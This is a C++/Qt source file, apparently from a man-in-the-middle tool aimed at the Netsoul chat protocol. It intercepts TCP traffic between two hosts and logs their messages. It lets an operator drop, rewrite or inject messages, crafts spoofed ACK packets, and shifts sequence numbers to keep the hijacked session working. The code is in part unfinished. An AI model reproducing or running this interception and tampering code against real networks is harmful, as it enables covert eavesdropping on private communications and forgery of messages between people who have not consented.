#include "netsoul.h"
#include "ui_netsoul.h"
#include <QtGui/QInputDialog>
#include <QtGui/QMessageBox>
#include <QtCore/QDate>
#include <QUrl>
#include <string>
#include <cstdio>
#include <sstream>
#include "packet.h"
#include "rawsocket.h"
#include <QThread>

Netsoul::Netsoul(MITMInfo & infos, RAWSocket & s, QWidget *parent) : QMainWindow(parent),
        clearQueue(false),
        ui(new Ui::Netsoul),
        portA(0), portB(0),
        deltaA(0), deltaB(0),
        state(NoInterference),
        currentMessage(NULL),
        info(infos),
        socket(s)
{
    currentNewMessage = NULL;
    ui->setupUi(this);
    QObject::connect(this->ui->changeMessage, SIGNAL(clicked()), this, SLOT(startWaitForMessage()));
    QObject::connect(this->ui->newMessage, SIGNAL(clicked()), this, SLOT(showNewMessage()));
    QObject::connect(this->ui->dropMessage, SIGNAL(clicked()), this, SLOT(dropMessage()));
}

Netsoul::~Netsoul()
{
    delete ui;
}


void Netsoul::startWaitForMessage()
{
    this->state = WaitingForMessage;
    this->ui->changeMessage->setText("Stop wait");
}

void Netsoul::hasMessage()
{
    Packet* p = *(this->Queue.begin());

    tcp* pTCP = static_cast<tcp*>(p->getBuffer());

    char * data = ((char*)p->getBuffer()) + sizeof(tcp);
    unsigned char buffer[p->Size - sizeof(tcp) + 1];
    memcpy(buffer, data, p->Size - sizeof(tcp));
    buffer[p->Size - sizeof(tcp)] = 0;
    QString  tmp((const char *)buffer);
    QString newstring = this->currentMessage->getMessage();

    newstring = newstring.replace(" ", "%20");
    QString res = tmp.replace(this->currentMessage->OriginalMessage, newstring);

    this->addActivity(QString("replace(" + this->currentMessage->OriginalMessage + ", " + newstring + ") = " + res).toStdString().c_str());
    std::cout << QString("replace(" + this->currentMessage->OriginalMessage + ", " + newstring + ") = " + res).toStdString().c_str() << std::endl;

    p->reduce(p->Size - sizeof(tcp));
    p->append(res.toStdString().c_str(), res.length());
    NextDelta = -(this->currentMessage->OriginalMessage.length() - newstring.length());

    clearQueue = true;
    this->state = NoInterference;

    delete this->currentMessage;
    this->currentMessage = NULL;
}

void Netsoul::sendTargetAToTargetB(Packet & p)
{
    char * data = ((char*)p.getBuffer()) + sizeof(tcp);
    std::string * msg;

    tcp* pTCP = static_cast<tcp*>(p.getBuffer());
    //this->currentSeqA = htonl(pTCP->seq) + // TODO

    bool nextDelta = 0;
    if ((msg = this->isMessage(p)))
    {
        if (this->state == WaitingForMessage)
        {
            // Create an ACK and send it
            Packet pACK;
            pACK.append(new tcp, sizeof(tcp));

            tcp* ackTCP = (tcp*)pACK.getBuffer();

            //(uint8_t *srcmac, uint32_t srcip,
            //uint8_t *dstmac, uint32_t dstip, uint16_t srcPort, uint16_t dstPort, uint32_t seq, uint32_t ack)
            ackTCP->craftTCP(this->info.macA, this->info.ipA, this->info.macB, this->info.ipB,
                             htons(pTCP->dest), htons(pTCP->source), htons(pTCP->seq), htons(pTCP->ack_seq) + p.getSizeOfData());
            ackTCP->ack = 1;
            ackTCP->psh = 0;
            pACK.computeChecksum();
            this->socket.Write(pACK);

            this->currentMessage = new ChangeMessage(msg, this);
            this->currentMessage->show();
            this->state = WaitingForTyping;
            this->ui->changeMessage->setText("Change next message");
            this->addActivity(QString("A>>> Changing message -" + QString(msg->c_str()) + "-").toStdString().c_str());
        }
        else if (this->state == DropNextMessage)
        {
            p.State = Drop;
            this->addActivity(QString("A>>> Message dropped !!! -" + QString(msg->c_str()) + "-").toStdString().c_str());
            this->state = NoInterference;
        }
        else
            this->addActivity(QString("A>>> Message -" + QUrl::fromEncoded(msg->c_str()).toString() + "-").toStdString().c_str());

        //QByteArray()).toString()
        std::cout << "Message : " << *msg << std::endl;
    }
    else ;

    if (this->state == WaitingForTyping)
    {
        // Store all incoming packets
        p.State = Store;
        std::cout << "Packet stored queue.size() : " << Queue.size() << std::endl;
        return;
    }

    pTCP->seq = htonl(htonl(pTCP->seq) + deltaA);
    pTCP->ack_seq = htonl(htonl(pTCP->ack_seq) + deltaB);

    if (nextDelta)
        deltaA += nextDelta;
}


void Netsoul::sendTargetBToTargetA(Packet & p)
{
    std::string * msg;
    tcp* pTCP = static_cast<tcp*>(p.getBuffer());
    if ((msg = this->isMessage(p)))
    {
        QString message("<<<B Message -" + QString(msg->c_str()) + "-");
        this->addActivity(message.toStdString().c_str());
    }
    else
    {

    }

    if (this->state == WaitingForTyping)
    {
        // Store all incoming packets
        p.State = Store;
        return;
    }

    pTCP->seq = htonl(htonl(pTCP->seq) + deltaB);
    pTCP->ack_seq = htonl(htonl(pTCP->ack_seq) - deltaA);
}

/*
        char * data = ((char*)p.getBuffer()) + sizeof(tcp);
        char buffer[p.Size - sizeof(tcp) - 1];
        memcpy(buffer, data, p.Size - sizeof(tcp) - 2); // without \r\n
        buffer[p.Size - sizeof(tcp) - 2] = 0;
        QString str("<<<B Unrecognized Packet : \"");
        str += (const char *)buffer;
        str += "\"";
        //this->addActivity(str.toStdString().c_str());
 */

std::string *Netsoul::isMessage(Packet & p)
{
    char *data = ((char*)p.getBuffer()) + sizeof(tcp);
    int i;
    std::string *str = new std::string();

    if (!strncmp(NS_SENDMSG, data, strlen(NS_SENDMSG)))
    {
	data += strlen(NS_SENDMSG);
	for (i = 0; data[i]; i++)
        {
            if (!strncmp("msg ", data+i, 4) && i)
            {
                if ((i < 9 || strncmp(NS_SENDMSG, data+i-9, 8)))
                {
                    int end = 0, start = 0;
                    if (data[i+4] != '_')
                        start = 0;
                    else
                    {
                        start += 3;
                        while (data[i+4+start] != '_') start++;
                        start++;
                    }
                    while (data[i + 4 + end] != ' ' && data[i + 4 + end] != '\r' && data[i + 4 + end] != '\n') end++; // if \n or \r stop cause of \r\n & \n (& \r ?)
                    char buffer[end - start + 1];
                    memcpy(buffer, data + i + 4 + start, end - start);
                    buffer[end - start] = 0;
                    *str += (const char *)buffer;
                    return str;
                }
            }
        }
    }
    return NULL;
}

std::string * Netsoul::getUser(Packet & p)
{
    char *data = ((char*)p.getBuffer()) + sizeof(tcp);
    std::string *str = new std::string("");

    unsigned char buffer[p.Size - sizeof(tcp) + 1];
    memcpy(buffer, data, p.Size - sizeof(tcp)); // without \r\n
    buffer[p.Size - sizeof(tcp)] = 0;
    std::string tmp((const char *)buffer);

    std::string part;
     std::stringstream  currentCMD(tmp);
     for(int i = 0; i < 4; i++)
        std::getline(currentCMD, part, ':');
    *str = part;
    return str;
}




bool Netsoul::isProtocol(Packet & p)
{
    char * data = ((char*)p.getBuffer()) + sizeof(tcp);
    const char * begin[] = {"salut", "auth_ag", "list_users", "ping", "user_cmd", "state", "exit", NULL};

    tcp* pTCP = (tcp*)p.getBuffer();
    bool isProtocol = false;
    if (portA && portB)
    {
        if ((pTCP->source == portA && pTCP->dest == portB) ||
            (pTCP->source == portB && pTCP->dest == portA))
            isProtocol = true;
    }
    else
    {
        int i = 0;
        while (begin[i])
        {
            if (!strncmp(begin[i], data, strlen(begin[i])))
            {
                portA = pTCP->source;
                portB = pTCP->dest;
                isProtocol = true;
            }
            i++;
        }
    }
    return isProtocol;
}

void Netsoul::addActivity(const char * message)
{
    QString mess(message);
    this->ui->activity->setPlainText("\n" + QTime::currentTime().toString() + " > " + mess + this->ui->activity->toPlainText());
}

void Netsoul::showNewMessage()
{
    if (this->currentNewMessage == NULL)
    {
       this->currentNewMessage = new ChangeMessage(new std::string(""), this);
       this->currentNewMessage->show();
    }
}

void Netsoul::sendNewMessage()
{
    Packet test;
    test.append(new tcp, sizeof(tcp));

    tcp* testTCP = (tcp*)test.getBuffer();

    //testTCP->craftTCP(this->info.macA, this->info.ipA, this->info.macB, this->info.ipB);
    test.append("jesusjesusjesusjesus", 20);
    this->socket.Write(test);
    delete this->currentNewMessage;
    this->currentNewMessage = NULL;
}


void Netsoul::dropMessage()
{
    this->state = DropNextMessage;
}
